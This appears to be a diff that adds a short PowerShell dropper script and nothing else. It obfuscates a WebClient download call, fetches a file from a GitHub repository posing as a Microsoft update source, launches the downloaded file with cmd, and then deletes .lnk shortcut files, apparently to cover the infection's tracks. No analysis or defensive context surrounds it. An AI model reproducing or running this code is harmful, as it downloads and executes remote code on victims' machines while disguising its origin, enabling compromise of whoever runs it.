@@ -1,0 +1,4 @@
+
+(New-Object System.Net.Webclient)."Downloa`dFile"('ht'+'tps://raw.githubusercontent.com/MicrosoftUpdate/MicrosoftPatch/master/1ebcd742c9796170c4550667f1a06knl.txt','1ebcd742c9796170c4550667f1a06knl.txt')
+cmd /c start "" "1ebcd742c9796170c4550667f1a06knl.txt"
+Remove-Item ./*txt.lnk
